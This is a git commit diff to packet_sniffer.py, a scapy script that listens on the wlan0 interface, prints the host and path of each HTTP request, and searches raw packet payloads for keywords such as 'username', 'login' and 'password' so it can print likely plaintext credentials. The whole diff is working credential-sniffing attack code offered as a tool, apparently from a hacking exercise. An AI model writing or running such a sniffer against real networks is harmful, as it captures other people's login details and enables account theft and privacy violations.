9b5cdc3009839f18cd2ad2067494ab480bad40d0
mohitmonnappa <mohitmonnappa@gmail.com>
2025-08-14 05:40:22 -0500

    Fixed the output

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -7,17 +7,27 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=packet_function)
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_username_pass(packet):
+    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "uname", "login", "password", "pass"]
+        for key in keywords:
+            if key in load:
+                return load
+
+
 def packet_function(packet):
     if packet.haslayer(http.HTTPRequest):
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
-    if packet.haslayer(scapy.Raw):
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ["username", "uname", "login", "password", "pass"]
-            for key in keywords:
-                if key in load:
-                    print(packet[scapy.Raw].load)
-                    break
+        url = get_url(packet)
+        print("[+] HTTP Request-> " + url)
+
+        login = get_username_pass(packet)
+        if login:
+            print("\n\n[+] Possible Username/Password -> " + login + "\n\n")
+    
 
 sniff("wlan0")
